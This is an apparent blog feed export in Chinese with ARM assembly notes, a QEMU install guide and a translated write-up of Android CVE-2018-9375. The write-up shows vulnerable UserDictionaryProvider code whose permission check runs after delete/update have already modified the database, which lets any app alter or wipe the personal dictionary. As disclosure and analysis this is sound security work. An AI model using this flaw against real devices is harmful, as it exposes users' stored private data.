<span style="color:#a6e22e">STR</span>    <span style="color:#66d9ef">Ra</span>, [<span style="color:#66d9ef">Rb</span>, <span style="color:#66d9ef">Rc</span>, <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#66d9ef">shifter</span><span style="color:#960050;background-color:#1e0010">&gt;</span>]
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">.data</span>
var1: <span style="color:#a6e22e">.word</span> <span style="color:#ae81ff">3</span>
var2: <span style="color:#a6e22e">.word</span> <span style="color:#ae81ff">4</span>
<span style="color:#a6e22e">.text</span>
<span style="color:#a6e22e">.global</span> <span style="color:#66d9ef">_start</span>
_start:
    <span style="color:#a6e22e">ldr</span> <span style="color:#66d9ef">r0</span>, <span style="color:#66d9ef">adr_var1</span>         <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">将存放</span><span style="color:#66d9ef">var1值的地址adr_var1加载到寄存器R0中</span> 
    <span style="color:#66d9ef">ldr</span> <span style="color:#66d9ef">r1</span>, <span style="color:#66d9ef">adr_var2</span>         <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">将存放</span><span style="color:#66d9ef">var2值的地址adr_var2加载到寄存器R1中</span> 
    <span style="color:#66d9ef">ldr</span> <span style="color:#66d9ef">r2</span>, [<span style="color:#66d9ef">r0</span>]             <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">将</span><span style="color:#66d9ef">R0所指向地址中存放的0x3加载到寄存器R2中</span>  
    <span style="color:#66d9ef">str</span> <span style="color:#66d9ef">r2</span>, [<span style="color:#66d9ef">r1</span>, <span style="color:#66d9ef">r2</span>, <span style="color:#66d9ef">LSL</span><span style="color:#75715e">#2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">str</span> <span style="color:#66d9ef">r2</span>, [<span style="color:#66d9ef">r1</span>, <span style="color:#66d9ef">r2</span>, <span style="color:#66d9ef">LSL</span><span style="color:#75715e">#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 = R1 + R2&lt;&lt;2。
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">ldr</span> <span style="color:#66d9ef">r3</span>, [<span style="color:#66d9ef">r1</span>], <span style="color:#66d9ef">r2</span>, <span style="color:#66d9ef">LSL</span><span style="color:#75715e">#2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 = R1 + R2&lt;&lt;2。
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">bkpt</span>
adr_var1: <span style="color:#a6e22e">.word</span> <span style="color:#66d9ef">var1</span>
adr_var2: <span style="color:#a6e22e">.word</span> <span style="color:#66d9ef">var2</span>
</code></pre></div><p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180810162414.png" alt=""></p>
<p>如何区分取址模式：</p>
<p>如果有一个叹号!，那就是索引前置取址模式，即使用计算后的地址，之后更新基址寄存器。</p>
<p>如果在[]外有一个寄存器，那就是索引后置取址模式，即使用原有基址寄存器重的地址，之后再更新基址寄存器</p>
<p>除此之外，就都是偏移取址模式了</p>
</li>
<li>
<p><strong>关于PC相对取址的LDR指令</strong></p>
<p>有时候LDR并不仅仅被用来从内存中加载数据。还有如下这操作:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">.section</span> <span style="color:#66d9ef">.text</span>
<span style="color:#a6e22e">.global</span> <span style="color:#66d9ef">_start</span>
_start:
   <span style="color:#a6e22e">ldr</span> <span style="color:#66d9ef">r0</span>, <span style="color:#960050;background-color:#1e0010">=</span><span style="color:#66d9ef">jump</span>        <span style="color:#960050;background-color:#1e0010">/</span>* <span style="color:#960050;background-color:#1e0010">加载</span><span style="color:#66d9ef">jump标签所在的内存位置到R0</span> *<span style="color:#960050;background-color:#1e0010">/</span>
   <span style="color:#a6e22e">ldr</span> <span style="color:#66d9ef">r1</span>, <span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">0x68DB00AD</span>  <span style="color:#960050;background-color:#1e0010">/</span>* <span style="color:#960050;background-color:#1e0010">加载立即数</span><span style="color:#ae81ff">0x68DB00AD</span><span style="color:#960050;background-color:#1e0010">到</span><span style="color:#66d9ef">R1</span> *<span style="color:#960050;background-color:#1e0010">/</span>
jump:
   <span style="color:#a6e22e">ldr</span> <span style="color:#66d9ef">r2</span>, <span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">511</span>         <span style="color:#960050;background-color:#1e0010">/</span>* <span style="color:#960050;background-color:#1e0010">加载立即数</span><span style="color:#ae81ff">511</span><span style="color:#960050;background-color:#1e0010">到</span><span style="color:#66d9ef">R2</span> *<span style="color:#960050;background-color:#1e0010">/</span> 
   <span style="color:#66d9ef">bkpt</span>
</code></pre></div><p>这些指令学术上被称作伪指令。</p>
</li>
<li>
<p><strong>在ARM中使用立即数的规律</strong></p>
<p>在ARM中不能像X86那样直接将立即数加载到寄存器中。因为你使用的立即数是受限的。</p>
<p>立即数的值：v = n ror 2*r 有效的立即数都可以通过循环右移来得到</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#75715e">#256        // 1 循环右移 24位 --&gt; 256
</span><span style="color:#75715e">#384        // 6 循环右移 26位 --&gt; 384
</span><span style="color:#75715e">#484        // 121 循环右移 30位 --&gt; 484
</span><span style="color:#75715e">#16384      // 1 循环右移 18位 --&gt; 16384
</span><span style="color:#75715e">#2030043136 // 121 循环右移 8位 --&gt; 2030043136
</span><span style="color:#75715e">#0x06000000 // 6 循环右移 8位 --&gt; 100663296 (十六进制值0x06000000)
</span><span style="color:#75715e"></span><span style="color:#a6e22e">Invalid</span> <span style="color:#66d9ef">values</span>:
<span style="color:#75715e">#370        // 185 循环右移 31位 --&gt; 31不在范围内 (0 – 30)
</span><span style="color:#75715e">#511        // 1 1111 1111 --&gt; 比特模型不符合
</span><span style="color:#75715e">#0x06010000 // 1 1000 0001.. --&gt; 比特模型不符合
</span></code></pre></div><p>这样并不能一次性加载所有的32位值。不过我们可以通过以下的两个选项来解决这个问题：</p>
<ul>
<li>
<p>用小部分去组成更大的值。    MOV r0, #511  将511分成两部分：MOV r0, #256, and ADD r0, #255</p>
</li>
<li>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">.section</span> <span style="color:#66d9ef">.text</span>
<span style="color:#a6e22e">.global</span> <span style="color:#66d9ef">_start</span>
_start:
 <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r0</span>, <span style="color:#75715e">#256   /* 1 ror 24 = 256, so it&#39;s valid */
</span><span style="color:#75715e"></span> <span style="color:#66d9ef">add</span> <span style="color:#66d9ef">r0</span>, <span style="color:#75715e">#255   /* 255 ror 0 = 255, valid. r0 = 256 + 255 = 511 */
</span><span style="color:#75715e"></span> <span style="color:#66d9ef">ldr</span> <span style="color:#66d9ef">r1</span>, <span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">511</span>   <span style="color:#960050;background-color:#1e0010">/</span>* <span style="color:#66d9ef">load</span> <span style="color:#ae81ff">511</span> <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">the</span> <span style="color:#66d9ef">literal</span> <span style="color:#66d9ef">pool</span> <span style="color:#66d9ef">using</span> <span style="color:#66d9ef">LDR</span> *<span style="color:#960050;background-color:#1e0010">/</span>
 <span style="color:#a6e22e">bkpt</span>
</code></pre></div><p>计算立即数的有效值脚本：https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">azeria@labs:~$ python rotator.py
Enter the value you want to check: 511
Sorry, <span style="color:#ae81ff">511</span> cannot be used as an immediate number and has to be split.
azeria@labs:~$ python rotator.py
Enter the value you want to check: 256
The number <span style="color:#ae81ff">256</span> can be used as a valid immediate number.
<span style="color:#ae81ff">1</span> ror <span style="color:#ae81ff">24</span> --&gt; 256
</code></pre></div></li>
</ul>
<p>下面的部分指令用到在详细查，记的话脑壳痛</p>
<h5 id="跳转指令">跳转指令</h5>
<ol>
<li><code>B</code></li>
<li><code>BL</code></li>
<li><code>BX</code></li>
<li><code>BXL</code></li>
</ol>
<h5 id="存储器操作指令">存储器操作指令</h5>
<ol>
<li><code>LDM</code></li>
<li><code>STM</code></li>
<li><code>PUSH</code></li>
<li><code>POP</code></li>
<li><code>SWP</code></li>
</ol>
<h5 id="数据处理">数据处理</h5>
<ol>
<li><code>MOV</code></li>
<li><code>MVN</code></li>
<li><code>ADD</code></li>
<li><code>ADC</code></li>
<li><code>SUB</code></li>
<li><code>RSB</code></li>
<li><code>SBC</code></li>
<li><code>RSC</code></li>
<li><code>MUL</code></li>
<li><code>MLS</code></li>
<li><code>MLA</code></li>
<li><code>UMULL</code></li>
<li><code>UMLAL</code></li>
<li><code>SMUULL</code></li>
<li><code>SMLAL</code></li>
<li><code>SMLAD</code></li>
<li><code>SMLSD</code></li>
<li><code>SDIV</code></li>
<li><code>UDIV</code></li>
<li><code>ASR</code></li>
<li><code>AND</code></li>
<li><code>ORR</code></li>
<li><code>EOR</code></li>
<li><code>BIC</code></li>
<li><code>LSL</code></li>
<li><code>LSR</code></li>
<li><code>RRX</code></li>
<li><code>ROR</code></li>
<li><code>CMP</code></li>
<li><code>CMN</code></li>
<li><code>TSL</code></li>
<li><code>TEQ</code></li>
</ol>
<h5 id="其他指令">其他指令</h5>
<ol>
<li>
<p><code>SWI</code></p>
</li>
<li>
<p><code>NOP</code></p>
</li>
<li>
<p><code>MRS</code></p>
</li>
<li>
<p><code>MSR</code></p>
</li>
</ol>
<h3 id="heading"></h3>
</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>QEMU的安装使用</title>
            <link>https://kuekiko.top/posts/2018/08/qemu%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</link>
            <pubDate>Thu, 09 Aug 2018 19:34:34 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/08/qemu%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</guid>
            <description>QEMU的安装使用 安装 WIndows：https://qemu.weilnetz.de/w64/ 下载exe安装就行
MACOS:brew install qemu or sudo port install qemu
LINUX：
 Arch: pacman -S qemu Debian/Ubuntu: apt-get install qemu Fedora: dnf install @virtualization Gentoo: emerge --ask app-emulation/qemu RHEL/CentOS: yum install qemu-kvm SUSE: zypper install qemu  源码安装：https://download.qemu.org/
wget
wget https://download.qemu.org/qemu-3.0.0-rc1.tar.xztar xvJf qemu-3.0.0-rc1.tar.xzcd qemu-3.0.0-rc1./configuremakegit
git clone git://git.qemu.org/qemu.gitcd qemugit submodule initgit submodule update --recursive./configuremake最新的开发发生在主分支上。稳定的树位于名为“稳定x”的分支中。YY分支,X。YY是发布版本。
树莓派内核制作（在windows上) 下载树莓派系统：http://downloads.raspberrypi.org/raspbian/images/
下载qume 的树莓派内核： https://github.</description>
            <content type="html"><![CDATA[<h1 id="qemu的安装使用">QEMU的安装使用</h1>
<h3 id="安装">安装</h3>
<p>WIndows：https://qemu.weilnetz.de/w64/ 下载exe安装就行</p>
<p>MACOS:<code>brew install qemu</code>  or <code>sudo port install qemu</code></p>
<p>LINUX：</p>
<ul>
<li><strong>Arch:</strong> <code>pacman -S qemu</code></li>
<li><strong>Debian/Ubuntu:</strong> <code>apt-get install qemu</code></li>
<li><strong>Fedora:</strong> <code>dnf install @virtualization</code></li>
<li><strong>Gentoo:</strong> <code>emerge --ask app-emulation/qemu</code></li>
<li><strong>RHEL/CentOS:</strong> <code>yum install qemu-kvm</code></li>
<li><strong>SUSE:</strong> <code>zypper install qemu</code></li>
</ul>
<p>源码安装：https://download.qemu.org/</p>
<p>wget</p>
<pre><code>wget https://download.qemu.org/qemu-3.0.0-rc1.tar.xz
tar xvJf qemu-3.0.0-rc1.tar.xz
cd qemu-3.0.0-rc1
./configure
make
</code></pre><p>git</p>
<pre><code>git clone git://git.qemu.org/qemu.git
cd qemu
git submodule init
git submodule update --recursive
./configure
make
</code></pre><p>最新的开发发生在主分支上。稳定的树位于名为“稳定x”的分支中。YY分支,X。YY是发布版本。</p>
<h3 id="树莓派内核制作在windows上">树莓派内核制作（在windows上)</h3>
<p>下载树莓派系统：http://downloads.raspberrypi.org/raspbian/images/</p>
<p>下载qume 的树莓派内核： <a href="https://github.com/dhruvvyas90/qemu-rpi-kernel">https://github.com/dhruvvyas90/qemu-rpi-kernel</a>   改名为kernel-qemu放在和系统镜像同目录下</p>
<p>放在了raspbia目录下</p>
<p><code>qemu-system-arm.exe -kernel kernel-qemu -cpu arm1176 -m 512 -M versatilepb -dtbversatile-pb.dtb -no-reboot -append &quot;root=/dev/sda2 panic=1rootfstype=ext4 rw&quot; -net nic -net user,hostfwd=tcp::5022-:22 -hda 2018-06-27-raspbian-stretch.img </code></p>
<p>注意自己下载的镜像版本</p>
<h3 id="linux上">Linux上</h3>
<p>待补充。。。</p>
]]></content>
        </item>
        
        <item>
            <title>在Android的个人字典中发现和利用漏洞(CVE-2018-9375)</title>
            <link>https://kuekiko.top/posts/2018/08/%E5%9C%A8android%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%AD%97%E5%85%B8%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9Ecve-2018-9375/</link>
            <pubDate>Sun, 05 Aug 2018 21:16:52 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/08/%E5%9C%A8android%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%AD%97%E5%85%B8%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9Ecve-2018-9375/</guid>
            <description>翻译的文章 渣渣翻译 原作者：Daniel Kachakil
 我正在审计一款Android手机，审计范围是所有已经安装了的应用程序。我的首选方法是，在时间允许的时候，就手动检查尽可能多的代码。我发现了一个巧妙的漏洞，这个漏洞允许我与一个内容提供者交互，而该内容提供者应该在最近的Android版本中受到保护：用户的个人词典，它存储了用户想要保留的非标准单词的拼写。
虽然理论上应该只授权给特权用户、授权的输入法编辑器(IMEs) ，以及拼写检查程序访问用户的个人词典，但是有一种方法可以绕过这些限制，允许恶意应用程序更新、删除甚至检索字典内的所有内容。而不需要任何权限或者与用户交互。
这个中等风险的漏洞被归类为权限提升，并于2018年6月修复，影响到Android的以下版本：6.0、6.0.1、7.0、7.1.1、7.1.2、8.0和8.1。
用户的个人词典 Android提供了一个自定义词典，可以手动输入或者自动定制，从用户的输入中学习。这本字典的入口为“设置→ 语言和键盘 → 个人词典” （也可能在“高级“或者不同的选项下）。他可能包含有敏感信息，比如姓名、地址、电话号码、电子邮件、密码、商业品牌、不存常的词汇（可能包括疾病、药品、技术术语等），甚至信用卡号。
用户还可以为每个单词或者句子定义一个快捷方式，因此想要输入的家庭地址的时候，你可以添加一个条目并简单地为其添加一个快捷方式（比如“myhome”）来自动完成填写。
在内部，这些单词存储在SQLLite数据库中，该数据库只包含有一个名为“words”的表（除了“android_metadata” ），这个表有6列：
 _id (INTEGER, PRIMARY KEY) word (TEXT) frequency (INTEGER) locale (TEXT) appid (INTEGER) shortcut (TEXT)  我们主要注意“word&amp;quot;这列，正如名称所示，它包含了自定义的单词。然而，同一数据库中所有剩余的列和表也可以访问。
漏洞细节 在较早版本的Android中，对个人字典的读写访问分别受到以下权限的保护：
 android.permission.READ_USER_DICTIONARY android.permission.WRITE_USER_DICTIONARY  对于新版本来说，这已经不再适用了，根据官方文档[1]:&amp;ldquo;从API 23开始，用户字典只能通过IME和拼写检查器访问” ，以前的权限已经被内部检查所取代，因此理论上，只有特权帐户(比如 root 和 system), 启用的IMEs和拼写检查器可以访问个人字典内容提供者 (content://user_dictionary/words)。
我们可以检查AOSP代码库，查看一个变更[2]中引入了一个新的名为canCallerAccessUserDictionary 的私有函数，并从 UserDictionary 内容提供者中的所有标准查询、插入、更新和删除函数中调用该函数，以防止对这些函数的未经授权的调用。
虽然更改似乎对查询和插入函数都有效，但是在更新和删除过程中，授权检查发生滞后引入了安全漏洞，允许任何应用程序通过公开的内容提供者成功地调用受影响的函数，从而绕过错误的授权检查。
在下面的 UserDictionaryProvider类[3]的代码中，注意高亮（标注在注释）的片段，查看在数据库已经被修改之后如何执行授权检查：
@Overridepublic int delete(Uri uri, String where, String[] whereArgs) {SQLiteDatabase db = mOpenHelper.</description>
            <content type="html"><![CDATA[<blockquote>
<p>翻译的文章 渣渣翻译
原作者：Daniel Kachakil</p>
</blockquote>
<p>我正在审计一款Android手机，审计范围是所有已经安装了的应用程序。我的首选方法是，在时间允许的时候，就手动检查尽可能多的代码。我发现了一个巧妙的漏洞，这个漏洞允许我与一个内容提供者交互，而该内容提供者应该在最近的Android版本中受到保护：用户的个人词典，它存储了用户想要保留的非标准单词的拼写。</p>
<p>虽然理论上应该只授权给特权用户、授权的输入法编辑器(IMEs) ，以及拼写检查程序访问用户的个人词典，但是有一种方法可以绕过这些限制，允许恶意应用程序更新、删除甚至检索字典内的所有内容。而不需要任何权限或者与用户交互。</p>
<p>这个中等风险的漏洞被归类为权限提升，并于2018年6月修复，影响到Android的以下版本：6.0、6.0.1、7.0、7.1.1、7.1.2、8.0和8.1。</p>
<h3 id="用户的个人词典">用户的个人词典</h3>
<p>Android提供了一个自定义词典，可以手动输入或者自动定制，从用户的输入中学习。这本字典的入口为“设置→ 语言和键盘 → 个人词典” （也可能在“高级“或者不同的选项下）。他可能包含有敏感信息，比如姓名、地址、电话号码、电子邮件、密码、商业品牌、不存常的词汇（可能包括疾病、药品、技术术语等），甚至信用卡号。</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180805212058.png" alt=""></p>
<p>用户还可以为每个单词或者句子定义一个快捷方式，因此想要输入的家庭地址的时候，你可以添加一个条目并简单地为其添加一个快捷方式（比如“myhome”）来自动完成填写。</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180805212115.png" alt=""></p>
<p>在内部，这些单词存储在SQLLite数据库中，该数据库只包含有一个名为“words”的表（除了“android_metadata” ），这个表有6列：</p>
<ul>
<li><code>_id (INTEGER, PRIMARY KEY)</code></li>
<li><code>word (TEXT)</code></li>
<li><code>frequency (INTEGER)</code></li>
<li><code>locale (TEXT)</code></li>
<li><code>appid (INTEGER)</code></li>
<li><code>shortcut (TEXT)</code></li>
</ul>
<p>我们主要注意“word&quot;这列，正如名称所示，它包含了自定义的单词。然而，同一数据库中所有剩余的列和表也可以访问。</p>
<h3 id="漏洞细节">漏洞细节</h3>
<p>在较早版本的Android中，对个人字典的读写访问分别受到以下权限的保护：</p>
<ul>
<li><code>android.permission.READ_USER_DICTIONARY</code></li>
<li><code>android.permission.WRITE_USER_DICTIONARY</code></li>
</ul>
<p>对于新版本来说，这已经不再适用了，根据官方文档[1]:&ldquo;从API 23开始，用户字典只能通过IME和拼写检查器访问” ，以前的权限已经被内部检查所取代，因此理论上，只有特权帐户(比如 <code>root</code> 和 <code>system</code>), 启用的IMEs和拼写检查器可以访问个人字典内容提供者  (<code>content://user_dictionary/words</code>)。</p>
<p>我们可以检查AOSP代码库，查看一个变更[2]中引入了一个新的名为<code>canCallerAccessUserDictionary</code> 的私有函数，并从 <code>UserDictionary</code>  内容提供者中的所有标准查询、插入、更新和删除函数中调用该函数，以防止对这些函数的未经授权的调用。</p>
<p>虽然更改似乎对查询和插入函数都有效，但是在更新和删除过程中，授权检查发生滞后引入了安全漏洞，允许任何应用程序通过公开的内容提供者成功地调用受影响的函数，从而绕过错误的授权检查。</p>
<p>在下面的 <code>UserDictionaryProvider</code>类[3]的代码中，注意高亮（标注在注释）的片段，查看在数据库已经被修改之后如何执行授权检查：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#a6e22e">@Override</span>

<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">delete</span><span style="color:#f92672">(</span>Uri uri<span style="color:#f92672">,</span> String where<span style="color:#f92672">,</span> String<span style="color:#f92672">[]</span> whereArgs<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
   SQLiteDatabase db <span style="color:#f92672">=</span> mOpenHelper<span style="color:#f92672">.</span><span style="color:#a6e22e">getWritableDatabase</span><span style="color:#f92672">();</span>
   <span style="color:#66d9ef">int</span> count<span style="color:#f92672">;</span>
   <span style="color:#66d9ef">switch</span> <span style="color:#f92672">(</span>sUriMatcher<span style="color:#f92672">.</span><span style="color:#a6e22e">match</span><span style="color:#f92672">(</span>uri<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
      <span style="color:#66d9ef">case</span> WORDS<span style="color:#f92672">:</span>
          count <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span><span style="color:#a6e22e">delete</span><span style="color:#f92672">(</span>USERDICT_TABLE_NAME<span style="color:#f92672">,</span> where<span style="color:#f92672">,</span> whereArgs<span style="color:#f92672">);</span>  <span style="color:#75715e">//db.delete
</span><span style="color:#75715e"></span>          <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
 
      <span style="color:#66d9ef">case</span> WORD_ID<span style="color:#f92672">:</span>
          String wordId <span style="color:#f92672">=</span> uri<span style="color:#f92672">.</span><span style="color:#a6e22e">getPathSegments</span><span style="color:#f92672">().</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>1<span style="color:#f92672">);</span>
          count <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span><span style="color:#a6e22e">delete</span><span style="color:#f92672">(</span>USERDICT_TABLE_NAME<span style="color:#f92672">,</span> Words<span style="color:#f92672">.</span><span style="color:#a6e22e">_ID</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;=&#34;</span> <span style="color:#f92672">+</span> wordId    <span style="color:#75715e">//db.delete
</span><span style="color:#75715e"></span>               <span style="color:#f92672">+</span> <span style="color:#f92672">(!</span>TextUtils<span style="color:#f92672">.</span><span style="color:#a6e22e">isEmpty</span><span style="color:#f92672">(</span>where<span style="color:#f92672">)</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34; AND (&#34;</span> <span style="color:#f92672">+</span> where <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;)&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">),</span> whereArgs<span style="color:#f92672">);</span>
          <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
 
       <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
          <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Unknown URI &#34;</span> <span style="color:#f92672">+</span> uri<span style="color:#f92672">);</span>
   <span style="color:#f92672">}</span>
 
   <span style="color:#75715e">// Only the enabled IMEs and spell checkers can access this provider.
</span><span style="color:#75715e"></span>   <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>canCallerAccessUserDictionary<span style="color:#f92672">())</span> <span style="color:#f92672">{</span>   <span style="color:#75715e">//!canCallerAccessUserDictionary()
</span><span style="color:#75715e"></span>       <span style="color:#66d9ef">return</span> 0<span style="color:#f92672">;</span>
   <span style="color:#f92672">}</span>

   getContext<span style="color:#f92672">().</span><span style="color:#a6e22e">getContentResolver</span><span style="color:#f92672">().</span><span style="color:#a6e22e">notifyChange</span><span style="color:#f92672">(</span>uri<span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
   mBackupManager<span style="color:#f92672">.</span><span style="color:#a6e22e">dataChanged</span><span style="color:#f92672">();</span>
   <span style="color:#66d9ef">return</span> count<span style="color:#f92672">;</span>
<span style="color:#f92672">}</span>


<span style="color:#a6e22e">@Override</span>

<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">update</span><span style="color:#f92672">(</span>Uri uri<span style="color:#f92672">,</span> ContentValues values<span style="color:#f92672">,</span> String where<span style="color:#f92672">,</span> String<span style="color:#f92672">[]</span> whereArgs<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
   SQLiteDatabase db <span style="color:#f92672">=</span> mOpenHelper<span style="color:#f92672">.</span><span style="color:#a6e22e">getWritableDatabase</span><span style="color:#f92672">();</span>
   <span style="color:#66d9ef">int</span> count<span style="color:#f92672">;</span>
   <span style="color:#66d9ef">switch</span> <span style="color:#f92672">(</span>sUriMatcher<span style="color:#f92672">.</span><span style="color:#a6e22e">match</span><span style="color:#f92672">(</span>uri<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
      <span style="color:#66d9ef">case</span> WORDS<span style="color:#f92672">:</span>
         count <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span><span style="color:#a6e22e">update</span><span style="color:#f92672">(</span>USERDICT_TABLE_NAME<span style="color:#f92672">,</span> values<span style="color:#f92672">,</span> where<span style="color:#f92672">,</span> whereArgs<span style="color:#f92672">);</span>  <span style="color:#75715e">//db.update
</span><span style="color:#75715e"></span>         <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>

      <span style="color:#66d9ef">case</span> WORD_ID<span style="color:#f92672">:</span>
         String wordId <span style="color:#f92672">=</span> uri<span style="color:#f92672">.</span><span style="color:#a6e22e">getPathSegments</span><span style="color:#f92672">().</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>1<span style="color:#f92672">);</span>
         count <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span><span style="color:#a6e22e">update</span><span style="color:#f92672">(</span>USERDICT_TABLE_NAME<span style="color:#f92672">,</span> values<span style="color:#f92672">,</span> Words<span style="color:#f92672">.</span><span style="color:#a6e22e">_ID</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;=&#34;</span> <span style="color:#f92672">+</span> wordId  <span style="color:#75715e">//db.update
</span><span style="color:#75715e"></span><span style="color:#f92672">+</span> <span style="color:#f92672">(!</span>TextUtils<span style="color:#f92672">.</span><span style="color:#a6e22e">isEmpty</span><span style="color:#f92672">(</span>where<span style="color:#f92672">)</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34; AND (&#34;</span> <span style="color:#f92672">+</span> where <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;)&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">),</span> whereArgs<span style="color:#f92672">);</span>
         <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>

      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
         <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Unknown URI &#34;</span> <span style="color:#f92672">+</span> uri<span style="color:#f92672">);</span>
   <span style="color:#f92672">}</span>

   <span style="color:#75715e">// Only the enabled IMEs and spell checkers can access this provider.
</span><span style="color:#75715e"></span>   <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>canCallerAccessUserDictionary<span style="color:#f92672">())</span> <span style="color:#f92672">{</span>       <span style="color:#75715e">//!canCallerAccessUserDictionary()
</span><span style="color:#75715e"></span>      <span style="color:#66d9ef">return</span> 0<span style="color:#f92672">;</span>
   <span style="color:#f92672">}</span>

   getContext<span style="color:#f92672">().</span><span style="color:#a6e22e">getContentResolver</span><span style="color:#f92672">().</span><span style="color:#a6e22e">notifyChange</span><span style="color:#f92672">(</span>uri<span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
   mBackupManager<span style="color:#f92672">.</span><span style="color:#a6e22e">dataChanged</span><span style="color:#f92672">();</span>
   <span style="color:#66d9ef">return</span> count<span style="color:#f92672">;</span>
<span style="color:#f92672">}</span>
</code></pre></div><p>最后注意<code>AndroidManifest.xml</code>文件对于显式导出的内容提供者不提供任何额外的保护（例如，intent过滤器或权限）：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;manifest</span> <span style="color:#a6e22e">xmlns:android=</span><span style="color:#e6db74">&#34;http://schemas.android.com/apk/res/android&#34;</span>
       <span style="color:#a6e22e">package=</span><span style="color:#e6db74">&#34;com.android.providers.userdictionary&#34;</span>
       <span style="color:#a6e22e">android:sharedUserId=</span><span style="color:#e6db74">&#34;android.uid.shared&#34;</span><span style="color:#f92672">&gt;</span>

   <span style="color:#f92672">&lt;application</span> <span style="color:#a6e22e">android:process=</span><span style="color:#e6db74">&#34;android.process.acore&#34;</span>
       <span style="color:#a6e22e">android:label=</span><span style="color:#e6db74">&#34;@string/app_label&#34;</span>
       <span style="color:#a6e22e">android:allowClearUserData=</span><span style="color:#e6db74">&#34;false&#34;</span>
